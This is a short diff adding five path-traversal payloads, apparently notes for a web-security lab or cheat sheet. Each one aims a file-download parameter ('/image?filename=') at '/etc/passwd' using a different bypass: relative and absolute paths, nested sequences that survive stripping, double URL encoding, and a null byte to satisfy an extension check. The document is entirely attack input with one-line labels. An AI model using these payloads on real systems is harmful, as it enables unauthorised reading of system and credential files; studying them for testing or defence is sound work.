@@ -1,0 +1,5 @@
+GET /image?filename=../../../etc/passwd -> relative
+GET /image?filename=/etc/passwd -> absolute
+GET /image?filename=....//....//....//etc/passwd -> inner sequences stripped
+GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd -> double encoded
+GET /image?filename=../../../etc/passwd%00.png -> if file extension is needed add a nullbyte
